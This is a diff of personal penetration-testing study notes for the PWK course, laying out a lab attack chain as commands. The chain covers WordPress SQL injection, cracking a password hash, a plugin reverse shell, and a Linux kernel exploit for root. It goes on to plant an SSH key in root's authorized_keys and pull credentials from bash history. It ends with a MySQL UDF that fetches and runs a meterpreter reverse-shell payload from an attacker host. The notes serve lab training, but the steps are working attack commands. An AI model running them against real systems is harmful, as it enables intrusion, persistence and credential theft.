@@ -3373,9 +3373,11 @@ drop function sys_eval;
 select sys_eval('dir');
      #+end_src
 
-**** the PWK way.
+** (the PWK way)
      + ref:
-       - about .so shared libraries, soname, etc. [[https://tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html][shared-libraries]]
+       - the original udf assume `--secure-file-priv=''`, in which case the udf escalate privilege. In this case the initial user does not have the (FILE) write permission.
+       - About .so shared libraries, soname, etc.: [[https://tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html][shared-libraries]]
+       - About sql permissions: [[https://dev.mysql.com/doc/refman/8.0/en/grant.html][mysql GRANT]]
      + info:
        - regarding to the unknown binary, the exploit referenced [[https://www.exploit-db.com/exploits/1518]]
        - compile the .so file, in which exists a do_system(...) function. pull necessary dependencies and compile.
@@ -3393,15 +3395,108 @@ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
        #+end_src
        - hex dump the shared object into the plugin directory
        #+begin_src sh
-xxd -ps raptor_udf2.so 
+xxd -ps raptor_udf2.so | tr -d '\n' > raptor_udf2.so.hex
+MariaDB [(none)]> set @shell = 0x7f454c...<hexContent>;
+MariaDB [(none)]> select @@plugin_dir;
+MariaDB [(none)]> select binary @shell into dumpfile '/home/dev/plugin/udf_sys_exec.so';
+  ## ERROR 1045 (28000): Access denied for user 'wp'@'%' (using password: YES)
+  ## i.e. cannot write file. lacking FILE permission. Need other routines.
        #+end_src
+       
+** Deeper Enumeration of the Web Application Server (the wp server)
+   + info:
+     - the aim is to gain write permission on the DB Server.
+   + src (kernel version enumeration):
+   #+begin_src sh
+netstat -tulpn
+  ## other services running on a same server?
+uname -a
+  ## 4.4.0-21-generic
+  ## the possibility of kernel exploit?
+searchsploit ubuntu 16.04
+  ## Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Loca | exploits/linux/local/45010.c
+  ## try the exploit
+   #+end_src
+   + src (compile and try the kernel exploit):
+#+begin_src sh
+gcc
+find / -name gcc -type f 2>/dev/null
+  ## is gcc installed on the target machine?
+  ## no gcc -> compile and transfer the binary.
+cp /usr/share/exploitdb/exploits/linux/local/45010.c ./
+gcc 45010.c -o 45010
+meterpreter > upload /home/kali/45010 /tmp/
+meterpreter > shell
+
+cd /tmp
+chmod +x 45010
+./45010
+whoami
+  ## root (a perfect-world scenario...)
+#+end_src
+   + src (migrate to a more stable connection, a ssh bind shell(or reverse)):
+   #+begin_src sh
+  ## on kali 
+ssh-keygen                # save harzard
+cat ~/.ssh/id_rsa.pub
+
+  ## on the wp server
+mkdir -p /root/.ssh
+echo "ssh-rsa AAAA....<pkContent>" >> /root/.ssh/authorized_keys
+   #+end_src
+   
+*** Searching for DB Credentials
+    + info:
+      - enum with root privilege.
+      - `/var/log/auth.log`
+      - `ls -lah /home/ajla`
+      - `/home/ajla/.bash_history`
+        ## in this scenario, the admin leaves the root pw in the command history
+
+** Targeting the Database Again  
+   + info:
+     - connect the DB with root credentials
+     - use udf to gain shell
+   + src (udf):
+   #+begin_src sql
+select binary @shell into dumpfile '/home/dev/plugin/udf_sys_exec.so';
+create function sys_exec returns int soname 'udf_sys_exec.so';
+select * from mysql.func where name='sys_exec';
+
+/** on kali */
+/** sudo python3 -m http.server 80 */
+
+/** on DB server, sys_exec -> do_system */
+select sys_exec('wget http://10.11.0.4');
+select sys_exec('chmod +x ./shell.elf');
+
+/** on kali */
+/** TODO use stand-alone multi/handler
+sudo msfconsole -q -x "use exploit/multi/handler;\
+set PAYLOAD linux/x86/meterpreter/reverse_tcp;\
+set LHOST 10.11.0.4;\
+set LPORT 443;\
+run"
+*/
+
+/** on DB server */
+select sys_exec('./shell.elf');
+   #+end_src
+   
+*** Post-Exploitation Enumeration (the mysql server, root)
+    + src:
+    #+begin_src sh
+
+    #+end_src
+    // continue p796
+
 
 
 * TODO list
   + AD, LDAP enum users
   + AD, enum flow
   + nmap: quick, full
-  + dirb
+  + dirb, simple util && advanced util
   + lfi
   + overflow
     - offset - length
@@ -3415,6 +3510,7 @@ xxd -ps raptor_udf2.so
     - without Admin, obfuscation, string substitution.
   + pivoting: ssh port-forward (local, remote, dynamic)
   + useful linux file structure (/proc, /dev)
+  + stand-alone multi/handler and payload
      
 ** boxes
    1. ensure 100% with msf.
@@ -3424,6 +3520,27 @@ xxd -ps raptor_udf2.so
 ** exam preparation
    1. read and summarize about the topics in the syllabus (possible routines, methods, tools)>
    2. use tools on boxes.
+      
+
+** flows:
+*** PWK cp24
+    - `sudo bash -c "echo '10.11.1.250 sandbox.local' >> /etc/hosts"`
+    - nmap `sudo nmap -sC -sS -p0-65535 sandbox.local` -> web application
+    - `dirb http://sandbox.local`
+    - application specific scanner `wpscan --url sandbox.local --enumerate ap,at,cb,dbe` ## plugins
+    - find the right keywords and target(wp plugins)`searchsploit survey poll`
+    - follow the exploit, TODO Burp and SQL Injection (PWK p755) `OR 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9,table_name,11 FROM information_schema.tables#"]`
+    - the SQL Injection -> wp username and pw hash
+    - (try to crack the pw -> get the wp pw) `echo "$P$BfBIi66MsPQgzmvYsUzwjc5vSx9L6i/" > pass.txt`
+    - `john --wordlist=/usr/share/wordlists/rockyou.txt pass.txt`
+    - wp admin -> wp plugin PHP reverse shell. (upload and install)
+    - `seclists/Web-Shells/WordPress/plugin-shell.php`
+    - use curl/wget to upload payload. -> reverse shell
+    - enum server. in `wp-config.php` find DB server info.
+    - use bash `portscan.sh` to enum the open ports
+    - ssh Remote port forward the DB port.
+    - find mysql exploits -> udf -> need write permission
+    - kernel exploit on the wp server -> root -> sql root pw from the command history -> udf to get the shell from the sql server
 
 * Book4_Chapter 01 An Introduction to TCP/IP
 ** a brief history
